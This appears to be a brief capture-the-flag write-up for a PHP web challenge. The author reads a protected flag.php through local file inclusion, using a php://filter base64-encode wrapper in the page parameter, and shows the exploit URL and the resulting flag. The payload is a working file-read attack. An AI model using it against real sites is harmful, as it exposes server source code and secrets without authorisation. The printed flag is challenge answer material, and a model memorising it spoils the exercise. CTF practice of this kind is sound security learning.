# Behind the Scene
"in this chall the web link we were given had a page= which load the php"
https://cybersecure-x-web2.chals.io/challenge.php?page=home.php
so there we have to pass the playload
so there i passed the flag.php and got bloacked so i did a resource filter
```
https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/convert.base64-encode/resource=flag.php
```
and got a cipher and here its what after decripting
![image](https://github.com/user-attachments/assets/aa582885-c9a7-41ef-a667-ad77e4b03467)

"and again passing it the path of the flag we get the flag"
![image](https://github.com/user-attachments/assets/e41b161d-6021-4975-9292-f023c96ac282)


### 🏁 Flag  
```
flag{basic_lfi_successful}

```
